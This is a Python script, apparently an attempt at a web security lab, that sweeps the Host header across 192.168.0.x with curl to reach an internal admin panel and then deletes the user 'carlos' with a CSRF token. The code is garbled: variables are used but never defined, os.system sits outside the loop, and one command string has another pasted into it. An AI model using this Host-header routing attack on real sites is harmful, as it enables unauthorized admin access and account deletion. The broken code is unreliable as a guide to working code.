import re
import os
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()

cookies = response.cookies
cookies_dict = requests.utils.dict_from_cookiejar(cookies)
cookies_header = '; '.join([f"{key}={value}" for key, value in cookies_dict.items()])
cookies_header = cookies_header

#Find local bind
for _ in range(256):
    command = f"curl --path-as-is -k -X POST -H 'Host: 192.168.0.{_}' '{burp_url}/admin' -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' -H 'Cookie: {cookies_header}'"

os.system(command)

#Find csrf
command = f"curl --path-as-is -k -X POST -H 'Host: {local_adress}' '{delete_url}    command = f"curl --path-as-is -k -X POST -H 'Host: 192.168.0.{_}' '{burp_url}/admin' -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' -H 'Cookie: {cookies_header}'"
' -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' -H 'Cookie: {cookies_header}'"
os.system(command)

#delete user
command = f"curl --path-as-is -k -X POST -H 'Host: {local_adress}' '{delete_url}&csrf={csrf}' -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0' -H 'Cookie: {cookies_header}'"
os.system(command)
